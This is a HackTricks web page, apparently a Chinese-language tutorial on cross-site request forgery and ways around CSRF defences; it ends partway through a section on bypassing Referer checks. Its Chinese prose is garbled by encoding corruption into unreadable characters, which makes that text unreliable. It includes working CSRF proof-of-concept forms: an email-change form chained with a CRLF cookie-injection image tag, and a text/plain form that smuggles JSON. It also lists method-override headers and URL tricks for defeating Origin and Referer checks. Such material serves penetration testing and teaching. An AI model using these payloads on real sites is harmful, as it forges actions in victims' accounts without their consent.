<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CSRF (Cross Site Request Forgery)</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="csrf-è·¨ç«™è¯·æ±‚ä¼ªé€ "><a class="header" href="#csrf-è·¨ç«™è¯·æ±‚ä¼ªé€ ">CSRF (è·¨ç«™è¯·æ±‚ä¼ªé€ )</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼</p>
<h2 id="è·¨ç«™è¯·æ±‚ä¼ªé€ -csrf-è§£é‡Š"><a class="header" href="#è·¨ç«™è¯·æ±‚ä¼ªé€ -csrf-è§£é‡Š">è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF) è§£é‡Š</a></h2>
<p><strong>è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF)</strong> æ˜¯ä¸€ç§åœ¨ web åº”ç”¨ç¨‹åºä¸­å‘ç°çš„å®‰å…¨æ¼æ´ã€‚å®ƒä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åˆ©ç”¨ç”¨æˆ·çš„è®¤è¯ä¼šè¯ï¼Œä»£è¡¨æ¯«æ— é˜²å¤‡çš„ç”¨æˆ·æ‰§è¡Œæ“ä½œã€‚å½“ä¸€ä¸ªå·²ç™»å½•å—å®³è€…å¹³å°çš„ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™æ—¶ï¼Œæ”»å‡»å°±ä¼šè¢«æ‰§è¡Œã€‚è¯¥ç½‘ç«™éšåé€šè¿‡æ‰§è¡Œ JavaScriptã€æäº¤è¡¨å•æˆ–è·å–å›¾åƒç­‰æ–¹æ³•è§¦å‘å¯¹å—å®³è€…è´¦æˆ·çš„è¯·æ±‚ã€‚</p>
<h3 id="csrf-æ”»å‡»çš„å‰ææ¡ä»¶"><a class="header" href="#csrf-æ”»å‡»çš„å‰ææ¡ä»¶">CSRF æ”»å‡»çš„å‰ææ¡ä»¶</a></h3>
<p>è¦åˆ©ç”¨ CSRF æ¼æ´ï¼Œå¿…é¡»æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š</p>
<ol>
<li><strong>è¯†åˆ«æœ‰ä»·å€¼çš„æ“ä½œ</strong>ï¼šæ”»å‡»è€…éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå€¼å¾—åˆ©ç”¨çš„æ“ä½œï¼Œä¾‹å¦‚æ›´æ”¹ç”¨æˆ·çš„å¯†ç ã€ç”µå­é‚®ä»¶æˆ–æå‡æƒé™ã€‚</li>
<li><strong>ä¼šè¯ç®¡ç†</strong>ï¼šç”¨æˆ·çš„ä¼šè¯åº”ä»…é€šè¿‡ cookies æˆ– HTTP åŸºæœ¬è®¤è¯å¤´è¿›è¡Œç®¡ç†ï¼Œå› ä¸ºå…¶ä»–å¤´æ— æ³•ç”¨äºæ­¤ç›®çš„ã€‚</li>
<li><strong>ç¼ºä¹ä¸å¯é¢„æµ‹çš„å‚æ•°</strong>ï¼šè¯·æ±‚ä¸­ä¸åº”åŒ…å«ä¸å¯é¢„æµ‹çš„å‚æ•°ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¼šé˜»æ­¢æ”»å‡»ã€‚</li>
</ol>
<h3 id="å¿«é€Ÿæ£€æŸ¥"><a class="header" href="#å¿«é€Ÿæ£€æŸ¥">å¿«é€Ÿæ£€æŸ¥</a></h3>
<p>æ‚¨å¯ä»¥åœ¨ Burp ä¸­<strong>æ•è·è¯·æ±‚</strong>å¹¶æ£€æŸ¥ CSRF ä¿æŠ¤ï¼Œæ‚¨å¯ä»¥ä»æµè§ˆå™¨ä¸­ç‚¹å‡» <strong>å¤åˆ¶ä¸º fetch</strong> å¹¶æ£€æŸ¥è¯·æ±‚ï¼š</p>
<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
<h3 id="é˜²å¾¡-csrf"><a class="header" href="#é˜²å¾¡-csrf">é˜²å¾¡ CSRF</a></h3>
<p>å¯ä»¥å®æ–½å‡ ç§å¯¹ç­–æ¥ä¿æŠ¤å…å— CSRF æ”»å‡»ï¼š</p>
<ul>
<li><a href="hacking-with-cookies/#samesite"><strong>SameSite cookies</strong></a>ï¼šæ­¤å±æ€§é˜²æ­¢æµè§ˆå™¨åœ¨è·¨ç«™è¯·æ±‚ä¸­å‘é€ cookiesã€‚<a href="hacking-with-cookies/#samesite">äº†è§£æ›´å¤šå…³äº SameSite cookies</a>ã€‚</li>
<li><a href="cors-bypass.html"><strong>è·¨æºèµ„æºå…±äº«</strong></a>ï¼šå—å®³è€…ç½‘ç«™çš„ CORS ç­–ç•¥å¯èƒ½ä¼šå½±å“æ”»å‡»çš„å¯è¡Œæ€§ï¼Œç‰¹åˆ«æ˜¯å½“æ”»å‡»éœ€è¦è¯»å–å—å®³è€…ç½‘ç«™çš„å“åº”æ—¶ã€‚<a href="cors-bypass.html">äº†è§£ CORS ç»•è¿‡</a>ã€‚</li>
<li><strong>ç”¨æˆ·éªŒè¯</strong>ï¼šæç¤ºç”¨æˆ·è¾“å…¥å¯†ç æˆ–è§£å†³éªŒè¯ç å¯ä»¥ç¡®è®¤ç”¨æˆ·çš„æ„å›¾ã€‚</li>
<li><strong>æ£€æŸ¥å¼•èæˆ–æ¥æºå¤´</strong>ï¼šéªŒè¯è¿™äº›å¤´å¯ä»¥å¸®åŠ©ç¡®ä¿è¯·æ±‚æ¥è‡ªå—ä¿¡ä»»çš„æ¥æºã€‚ç„¶è€Œï¼Œç²¾å¿ƒæ„é€ çš„ URL å¯ä»¥ç»•è¿‡å®æ–½ä¸å½“çš„æ£€æŸ¥ï¼Œä¾‹å¦‚ï¼š</li>
<li>ä½¿ç”¨ <code>http://mal.net?orig=http://example.com</code>ï¼ˆURL ä»¥å—ä¿¡ä»»çš„ URL ç»“å°¾ï¼‰</li>
<li>ä½¿ç”¨ <code>http://example.com.mal.net</code>ï¼ˆURL ä»¥å—ä¿¡ä»»çš„ URL å¼€å¤´ï¼‰</li>
<li><strong>ä¿®æ”¹å‚æ•°åç§°</strong>ï¼šæ›´æ”¹ POST æˆ– GET è¯·æ±‚ä¸­å‚æ•°çš„åç§°å¯ä»¥å¸®åŠ©é˜²æ­¢è‡ªåŠ¨åŒ–æ”»å‡»ã€‚</li>
<li><strong>CSRF ä»¤ç‰Œ</strong>ï¼šåœ¨æ¯ä¸ªä¼šè¯ä¸­å¼•å…¥å”¯ä¸€çš„ CSRF ä»¤ç‰Œï¼Œå¹¶è¦æ±‚åœ¨åç»­è¯·æ±‚ä¸­ä½¿ç”¨è¯¥ä»¤ç‰Œï¼Œå¯ä»¥æ˜¾è‘—é™ä½ CSRF çš„é£é™©ã€‚é€šè¿‡å¼ºåˆ¶å®æ–½ CORSï¼Œå¯ä»¥å¢å¼ºä»¤ç‰Œçš„æœ‰æ•ˆæ€§ã€‚</li>
</ul>
<p>ç†è§£å’Œå®æ–½è¿™äº›é˜²å¾¡æªæ–½å¯¹äºç»´æŠ¤ web åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§è‡³å…³é‡è¦ã€‚</p>
<h2 id="é˜²å¾¡ç»•è¿‡"><a class="header" href="#é˜²å¾¡ç»•è¿‡">é˜²å¾¡ç»•è¿‡</a></h2>
<h3 id="ä»-post-åˆ°-get"><a class="header" href="#ä»-post-åˆ°-get">ä» POST åˆ° GET</a></h3>
<p>ä¹Ÿè®¸æ‚¨æƒ³è¦åˆ©ç”¨çš„è¡¨å•å‡†å¤‡å‘é€ <strong>å¸¦æœ‰ CSRF ä»¤ç‰Œçš„ POST è¯·æ±‚ï¼Œä½†</strong>ï¼Œæ‚¨åº”è¯¥ <strong>æ£€æŸ¥</strong> å¦‚æœ <strong>GET</strong> ä¹Ÿæ˜¯ <strong>æœ‰æ•ˆçš„</strong>ï¼Œå¹¶ä¸”å½“æ‚¨å‘é€ GET è¯·æ±‚æ—¶ <strong>CSRF ä»¤ç‰Œä»åœ¨è¢«éªŒè¯</strong>ã€‚</p>
<h3 id="ç¼ºå°‘ä»¤ç‰Œ"><a class="header" href="#ç¼ºå°‘ä»¤ç‰Œ">ç¼ºå°‘ä»¤ç‰Œ</a></h3>
<p>åº”ç”¨ç¨‹åºå¯èƒ½ä¼šå®ç°ä¸€ç§æœºåˆ¶æ¥ <strong>éªŒè¯ä»¤ç‰Œ</strong>ï¼Œå½“å®ƒä»¬å­˜åœ¨æ—¶ã€‚ç„¶è€Œï¼Œå¦‚æœåœ¨ä»¤ç‰Œç¼ºå¤±æ—¶å®Œå…¨è·³è¿‡éªŒè¯ï¼Œå°±ä¼šå‡ºç°æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ <strong>åˆ é™¤æºå¸¦ä»¤ç‰Œçš„å‚æ•°</strong>ï¼Œè€Œä¸ä»…ä»…æ˜¯å…¶å€¼æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚è¿™ä½¿ä»–ä»¬èƒ½å¤Ÿç»•è¿‡éªŒè¯è¿‡ç¨‹ï¼Œæœ‰æ•ˆåœ°è¿›è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF) æ”»å‡»ã€‚</p>
<h3 id="csrf-ä»¤ç‰Œæœªä¸ç”¨æˆ·ä¼šè¯ç»‘å®š"><a class="header" href="#csrf-ä»¤ç‰Œæœªä¸ç”¨æˆ·ä¼šè¯ç»‘å®š">CSRF ä»¤ç‰Œæœªä¸ç”¨æˆ·ä¼šè¯ç»‘å®š</a></h3>
<p>æœªå°† CSRF ä»¤ç‰Œä¸ç”¨æˆ·ä¼šè¯ç»‘å®šçš„åº”ç”¨ç¨‹åºå­˜åœ¨é‡å¤§ <strong>å®‰å…¨é£é™©</strong>ã€‚è¿™äº›ç³»ç»ŸéªŒè¯ä»¤ç‰Œæ˜¯é’ˆå¯¹ <strong>å…¨å±€æ± </strong> è€Œä¸æ˜¯ç¡®ä¿æ¯ä¸ªä»¤ç‰Œç»‘å®šåˆ°å‘èµ·ä¼šè¯ã€‚</p>
<p>æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™ä¸€ç‚¹ï¼š</p>
<ol>
<li><strong>ä½¿ç”¨è‡ªå·±çš„è´¦æˆ·è¿›è¡Œèº«ä»½éªŒè¯</strong>ã€‚</li>
<li><strong>ä»å…¨å±€æ± ä¸­è·å–æœ‰æ•ˆçš„ CSRF ä»¤ç‰Œ</strong>ã€‚</li>
<li><strong>åœ¨é’ˆå¯¹å—å®³è€…çš„ CSRF æ”»å‡»ä¸­ä½¿ç”¨è¯¥ä»¤ç‰Œ</strong>ã€‚</li>
</ol>
<p>è¿™ä¸€æ¼æ´ä½¿æ”»å‡»è€…èƒ½å¤Ÿä»£è¡¨å—å®³è€…å‘èµ·æœªç»æˆæƒçš„è¯·æ±‚ï¼Œåˆ©ç”¨åº”ç”¨ç¨‹åºçš„ <strong>ä¸å……åˆ†çš„ä»¤ç‰ŒéªŒè¯æœºåˆ¶</strong>ã€‚</p>
<h3 id="æ–¹æ³•ç»•è¿‡"><a class="header" href="#æ–¹æ³•ç»•è¿‡">æ–¹æ³•ç»•è¿‡</a></h3>
<p>å¦‚æœè¯·æ±‚ä½¿ç”¨çš„æ˜¯ä¸€ç§â€œ<strong>å¥‡æ€ªçš„</strong>â€ <strong>æ–¹æ³•</strong>ï¼Œè¯·æ£€æŸ¥ <strong>æ–¹æ³•</strong> <strong>è¦†ç›–åŠŸèƒ½</strong> æ˜¯å¦æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®ƒ <strong>ä½¿ç”¨ PUT</strong> æ–¹æ³•ï¼Œæ‚¨å¯ä»¥å°è¯• <strong>ä½¿ç”¨ POST</strong> æ–¹æ³•å¹¶ <strong>å‘é€</strong>ï¼š<em>https://example.com/my/dear/api/val/num?<strong>_method=PUT</strong></em></p>
<p>è¿™ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ POST è¯·æ±‚ä¸­å‘é€ <strong>_method å‚æ•°</strong> æˆ–ä½¿ç”¨ <strong>å¤´</strong> æ¥å®ç°ï¼š</p>
<ul>
<li><em>X-HTTP-Method</em></li>
<li><em>X-HTTP-Method-Override</em></li>
<li><em>X-Method-Override</em></li>
</ul>
<h3 id="è‡ªå®šä¹‰å¤´ä»¤ç‰Œç»•è¿‡"><a class="header" href="#è‡ªå®šä¹‰å¤´ä»¤ç‰Œç»•è¿‡">è‡ªå®šä¹‰å¤´ä»¤ç‰Œç»•è¿‡</a></h3>
<p>å¦‚æœè¯·æ±‚åœ¨è¯·æ±‚ä¸­æ·»åŠ äº†ä¸€ä¸ª <strong>è‡ªå®šä¹‰å¤´</strong>ï¼Œå¹¶å°† <strong>ä»¤ç‰Œ</strong> ä½œä¸º <strong>CSRF ä¿æŠ¤æ–¹æ³•</strong>ï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li>æµ‹è¯•ä¸å¸¦ <strong>è‡ªå®šä¹‰ä»¤ç‰Œå’Œå¤´</strong> çš„è¯·æ±‚ã€‚</li>
<li>æµ‹è¯•è¯·æ±‚ï¼Œä½¿ç”¨ç¡®åˆ‡ <strong>ç›¸åŒé•¿åº¦ä½†ä¸åŒçš„ä»¤ç‰Œ</strong>ã€‚</li>
</ul>
<h3 id="csrf-ä»¤ç‰Œé€šè¿‡-cookie-éªŒè¯"><a class="header" href="#csrf-ä»¤ç‰Œé€šè¿‡-cookie-éªŒè¯">CSRF ä»¤ç‰Œé€šè¿‡ cookie éªŒè¯</a></h3>
<p>åº”ç”¨ç¨‹åºå¯èƒ½é€šè¿‡åœ¨ cookie å’Œè¯·æ±‚å‚æ•°ä¸­å¤åˆ¶ä»¤ç‰Œï¼Œæˆ–é€šè¿‡è®¾ç½® CSRF cookie å¹¶éªŒè¯åç«¯å‘é€çš„ä»¤ç‰Œæ˜¯å¦ä¸ cookie ä¸­çš„å€¼ç›¸å¯¹åº”æ¥å®ç° CSRF ä¿æŠ¤ã€‚åº”ç”¨ç¨‹åºé€šè¿‡æ£€æŸ¥è¯·æ±‚å‚æ•°ä¸­çš„ä»¤ç‰Œæ˜¯å¦ä¸ cookie ä¸­çš„å€¼å¯¹é½æ¥éªŒè¯è¯·æ±‚ã€‚</p>
<p>ç„¶è€Œï¼Œå¦‚æœç½‘ç«™å­˜åœ¨ç¼ºé™·ï¼Œå…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­è®¾ç½® CSRF cookieï¼Œä¾‹å¦‚ CRLF æ¼æ´ï¼Œåˆ™æ­¤æ–¹æ³•å®¹æ˜“å—åˆ° CSRF æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åŠ è½½ä¸€ä¸ªæ¬ºéª—æ€§çš„å›¾åƒæ¥è®¾ç½® cookieï¼Œç„¶åå‘èµ· CSRF æ”»å‡»ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æ”»å‡»å¯èƒ½å¦‚ä½•æ„é€ çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-html">&lt;html&gt;
&lt;!-- CSRF Proof of Concept - generated by Burp Suite Professional --&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form action="https://example.com/my-account/change-email" method="POST"&gt;
&lt;input type="hidden" name="email" value="asd&amp;#64;asd&amp;#46;asd" /&gt;
&lt;input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>{% hint style="info" %}
æ³¨æ„ï¼Œå¦‚æœ<strong>csrf tokenä¸ä¼šè¯cookieç›¸å…³ï¼Œè¿™ä¸ªæ”»å‡»å°†ä¸èµ·ä½œç”¨</strong>ï¼Œå› ä¸ºä½ éœ€è¦å°†ä¼šè¯è®¾ç½®ä¸ºå—å®³è€…ï¼Œå› æ­¤ä½ å®é™…ä¸Šæ˜¯åœ¨æ”»å‡»è‡ªå·±ã€‚
{% endhint %}</p>
<h3 id="content-type-æ›´æ”¹"><a class="header" href="#content-type-æ›´æ”¹">Content-Type æ›´æ”¹</a></h3>
<p>æ ¹æ®<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests"><strong>è¿™ä¸ª</strong></a>ï¼Œä¸ºäº†<strong>é¿å…é¢„æ£€</strong>è¯·æ±‚ä½¿ç”¨<strong>POST</strong>æ–¹æ³•ï¼Œå…è®¸çš„Content-Typeå€¼å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong><code>application/x-www-form-urlencoded</code></strong></li>
<li><strong><code>multipart/form-data</code></strong></li>
<li><strong><code>text/plain</code></strong></li>
</ul>
<p>ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œ<strong>æœåŠ¡å™¨é€»è¾‘å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ</strong>ï¼Œå…·ä½“å–å†³äºä½¿ç”¨çš„<strong>Content-Type</strong>ï¼Œå› æ­¤ä½ åº”è¯¥å°è¯•æåˆ°çš„å€¼ä»¥åŠå…¶ä»–å¦‚**<code>application/json</code><strong>_</strong>,<strong>_</strong><code>text/xml</code>**, <strong><code>application/xml</code></strong><em>.</em></p>
<p>ç¤ºä¾‹ï¼ˆæ¥è‡ª<a href="https://brycec.me/posts/corctf_2021_challenges">è¿™é‡Œ</a>ï¼‰å°†JSONæ•°æ®ä½œä¸ºtext/plainå‘é€ï¼š</p>
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;
&lt;form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain"&gt;
&lt;input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'&gt;
&lt;/form&gt;
&lt;script&gt;
form.submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="ç»•è¿‡-json-æ•°æ®çš„é¢„æ£€è¯·æ±‚"><a class="header" href="#ç»•è¿‡-json-æ•°æ®çš„é¢„æ£€è¯·æ±‚">ç»•è¿‡ JSON æ•°æ®çš„é¢„æ£€è¯·æ±‚</a></h3>
<p>åœ¨å°è¯•é€šè¿‡ POST è¯·æ±‚å‘é€ JSON æ•°æ®æ—¶ï¼Œåœ¨ HTML è¡¨å•ä¸­ä½¿ç”¨ <code>Content-Type: application/json</code> æ˜¯ä¸ç›´æ¥å¯èƒ½çš„ã€‚åŒæ ·ï¼Œåˆ©ç”¨ <code>XMLHttpRequest</code> å‘é€æ­¤å†…å®¹ç±»å‹ä¼šå¯åŠ¨é¢„æ£€è¯·æ±‚ã€‚ç„¶è€Œï¼Œæœ‰ä¸€äº›ç­–ç•¥å¯ä»¥æ½œåœ¨åœ°ç»•è¿‡æ­¤é™åˆ¶ï¼Œå¹¶æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å¤„ç† JSON æ•°æ®ï¼Œè€Œä¸è€ƒè™‘ Content-Typeï¼š</p>
<ol>
<li><strong>ä½¿ç”¨æ›¿ä»£å†…å®¹ç±»å‹</strong>ï¼šé€šè¿‡åœ¨è¡¨å•ä¸­è®¾ç½® <code>enctype="text/plain"</code>ï¼Œä½¿ç”¨ <code>Content-Type: text/plain</code> æˆ– <code>Content-Type: application/x-www-form-urlencoded</code>ã€‚è¿™ç§æ–¹æ³•æµ‹è¯•åç«¯æ˜¯å¦åˆ©ç”¨æ•°æ®ï¼Œè€Œä¸è€ƒè™‘ Content-Typeã€‚</li>
<li><strong>ä¿®æ”¹å†…å®¹ç±»å‹</strong>ï¼šä¸ºäº†é¿å…é¢„æ£€è¯·æ±‚ï¼ŒåŒæ—¶ç¡®ä¿æœåŠ¡å™¨å°†å†…å®¹è¯†åˆ«ä¸º JSONï¼Œæ‚¨å¯ä»¥å‘é€æ•°æ®ï¼Œä½¿ç”¨ <code>Content-Type: text/plain; application/json</code>ã€‚è¿™ä¸ä¼šè§¦å‘é¢„æ£€è¯·æ±‚ï¼Œä½†å¦‚æœæœåŠ¡å™¨é…ç½®ä¸ºæ¥å— <code>application/json</code>ï¼Œåˆ™å¯èƒ½ä¼šè¢«æ­£ç¡®å¤„ç†ã€‚</li>
<li><strong>SWF Flash æ–‡ä»¶åˆ©ç”¨</strong>ï¼šä¸€ç§ä¸å¤ªå¸¸è§ä½†å¯è¡Œçš„æ–¹æ³•æ˜¯ä½¿ç”¨ SWF Flash æ–‡ä»¶æ¥ç»•è¿‡æ­¤ç±»é™åˆ¶ã€‚æœ‰å…³æ­¤æŠ€æœ¯çš„æ·±å…¥ç†è§£ï¼Œè¯·å‚é˜… <a href="https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937">è¿™ç¯‡æ–‡ç« </a>ã€‚</li>
</ol>
<h3 id="å¼•ç”¨æ¥æºæ£€æŸ¥ç»•è¿‡"><a class="header" href="#å¼•ç”¨æ¥æºæ£€æŸ¥ç»•è¿‡">å¼•ç”¨/æ¥æºæ£€æŸ¥ç»•è¿‡</a></h3>
<p><strong>é¿å…å¼•ç”¨å¤´</strong></p>
<p>åº”ç”¨ç¨‹åºå¯èƒ½ä»…åœ¨ 'Referer' å¤´å­˜åœ¨æ—¶è¿›è¡ŒéªŒè¯ã€‚ä¸ºäº†é˜²æ­¢æµè§ˆå™¨å‘é€æ­¤å¤´ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ HTML å…ƒæ ‡ç­¾ï¼š</p>
